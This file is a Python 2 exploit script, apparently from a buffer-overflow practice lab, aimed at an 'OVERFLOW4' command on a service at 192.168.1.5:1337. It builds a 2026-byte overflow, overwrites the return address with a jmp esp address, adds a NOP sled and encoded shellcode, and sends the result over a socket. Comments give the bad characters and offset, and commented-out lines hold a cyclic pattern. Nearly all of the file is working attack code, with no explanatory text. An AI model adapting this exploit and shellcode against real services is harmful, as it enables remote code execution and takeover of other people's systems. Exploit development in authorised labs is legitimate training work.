#!/usr/bin/python2

import socket 
import sys

host = "192.168.1.5"
port = 1337
size= 2500
offset = 2026
payload = ""
prefix  = "OVERFLOW4 "

try :
	# 625011DF jmp esp  \xdf\x11\x50\x62
	# badchars \x00\xa9\xcd\xd4
	# [*] Exact match at offset 2026

	print "[+]Trying .. \n"
#	badchars ="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xce\xcf\xd0\xd1\xd2\xd3\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
	buf =  b""
	buf += b"\xbe\xa3\xc4\x94\x08\xd9\xe5\xd9\x74\x24\xf4\x5d\x33"
	buf += b"\xc9\xb1\x52\x31\x75\x12\x03\x75\x12\x83\x66\xc0\x76"
	buf += b"\xfd\x94\x21\xf4\xfe\x64\xb2\x99\x77\x81\x83\x99\xec"
	buf += b"\xc2\xb4\x29\x66\x86\x38\xc1\x2a\x32\xca\xa7\xe2\x35"
	buf += b"\x7b\x0d\xd5\x78\x7c\x3e\x25\x1b\xfe\x3d\x7a\xfb\x3f"
	buf += b"\x8e\x8f\xfa\x78\xf3\x62\xae\xd1\x7f\xd0\x5e\x55\x35"
	buf += b"\xe9\xd5\x25\xdb\x69\x0a\xfd\xda\x58\x9d\x75\x85\x7a"
	buf += b"\x1c\x59\xbd\x32\x06\xbe\xf8\x8d\xbd\x74\x76\x0c\x17"
	buf += b"\x45\x77\xa3\x56\x69\x8a\xbd\x9f\x4e\x75\xc8\xe9\xac"
	buf += b"\x08\xcb\x2e\xce\xd6\x5e\xb4\x68\x9c\xf9\x10\x88\x71"
	buf += b"\x9f\xd3\x86\x3e\xeb\xbb\x8a\xc1\x38\xb0\xb7\x4a\xbf"
	buf += b"\x16\x3e\x08\xe4\xb2\x1a\xca\x85\xe3\xc6\xbd\xba\xf3"
	buf += b"\xa8\x62\x1f\x78\x44\x76\x12\x23\x01\xbb\x1f\xdb\xd1"
	buf += b"\xd3\x28\xa8\xe3\x7c\x83\x26\x48\xf4\x0d\xb1\xaf\x2f"
	buf += b"\xe9\x2d\x4e\xd0\x0a\x64\x95\x84\x5a\x1e\x3c\xa5\x30"
	buf += b"\xde\xc1\x70\x96\x8e\x6d\x2b\x57\x7e\xce\x9b\x3f\x94"
	buf += b"\xc1\xc4\x20\x97\x0b\x6d\xca\x62\xdc\x52\xa3\x6d\x15"
	buf += b"\x3b\xb6\x6d\x21\x69\x3f\x8b\x43\x9d\x16\x04\xfc\x04"
	buf += b"\x33\xde\x9d\xc9\xe9\x9b\x9e\x42\x1e\x5c\x50\xa3\x6b"
	buf += b"\x4e\x05\x43\x26\x2c\x80\x5c\x9c\x58\x4e\xce\x7b\x98"
	buf += b"\x19\xf3\xd3\xcf\x4e\xc5\x2d\x85\x62\x7c\x84\xbb\x7e"
	buf += b"\x18\xef\x7f\xa5\xd9\xee\x7e\x28\x65\xd5\x90\xf4\x66"
	buf += b"\x51\xc4\xa8\x30\x0f\xb2\x0e\xeb\xe1\x6c\xd9\x40\xa8"
	buf += b"\xf8\x9c\xaa\x6b\x7e\xa1\xe6\x1d\x9e\x10\x5f\x58\xa1"
	buf += b"\x9d\x37\x6c\xda\xc3\xa7\x93\x31\x40\xd7\xd9\x1b\xe1"
	buf += b"\x70\x84\xce\xb3\x1c\x37\x25\xf7\x18\xb4\xcf\x88\xde"
	buf += b"\xa4\xba\x8d\x9b\x62\x57\xfc\xb4\x06\x57\x53\xb4\x02"


	payload += prefix
	#payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"
	payload += "A"*offset
	payload += "\xdf\x11\x50\x62"  # jmp esp instruction
	payload += "\x90"*16
	payload += buf


	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(payload)
	print "[+] payload has been successfully \n"
	s.close()

except :
	print "[+] Host is down "
	sys.exit()